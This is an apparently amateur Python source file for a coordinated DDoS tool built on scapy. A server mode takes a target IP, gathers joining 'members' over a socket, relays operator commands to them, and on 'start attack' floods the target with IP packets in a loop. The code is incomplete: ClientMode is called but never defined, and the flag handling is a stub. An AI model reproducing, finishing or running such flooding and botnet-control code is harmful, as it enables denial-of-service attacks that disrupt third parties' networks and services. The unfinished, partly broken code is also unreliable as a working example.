from scapy.all import ICMP, ARP, IP, UDP, TCP, Ether, RandShort, RandIP, send
from threading import Thread
import socket
import Menus


class PortScanner:
    def __init__(self):
        pass


class Ddos:
    def __init__(self):
        self.Join = True
        self.Attack = False
        self.Flags = {
            "FIN": 0x01,
            "SYN": 0x02,
            "RST": 0x04,
            "PSH": 0x08,
            "ACK": 0x10,
            "URG": 0x20,
            "ECE": 0x40,
            "CWR": 0x80
        }
        mode = input("\n   [*]choose mode(server or client): ")
        if mode == "server":
            self._ServerMode()
        elif mode == "client":
            self.ClientMode()

    def _ServerMode(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Ip = input("\n   [*]Ip to be bound: ")

        self.TargetIp = input("\n   [*]Enter target ip: ")

        self.Port = int(input("\n   [*]Port to listen on: "))

        self.sock.bind((Ip, self.Port))

        NumOfPeople = int(input("\n   [*]Max number of members to join: "))

        self.sock.listen(NumOfPeople)

        self.PacketBlueprint = IP(dst=self.TargetIp)

        thrd = Thread(target=self._JoinParty, args=())
        thrd.start()

        Input = ""
        while Input != "exit\n":
            Input = input("   host@command>") + '\n'
            if Input == "start attack\n":
                self.Attack = True
                self.AttackTarget()
            elif Input == "stop attack\n":
                self.Attack = False
            elif Input == "stop join\n":
                self.Join = False
            elif Input == "resume join\n":
                self.Join = True
            elif "-flag" in Input:
                pass
            elif Input == "-help\n":
                print(Menus.HelpMenu)
            else:
                for i in range(len(self.members)):
                    self.members[i].send(Input.encode())
        self.Join = False

    def AttackTarget(self):
        print("   in attack function")
        while self.Attack:
            send(self.PacketBlueprint)

    def _JoinParty(self):
        self.members = []
        self.sock.setblocking(False)
        while True:
            if self.Join:
                try:
                    self.members.append(self.sock.accept()[0])
                except Exception:
                    pass
            else:
                pass
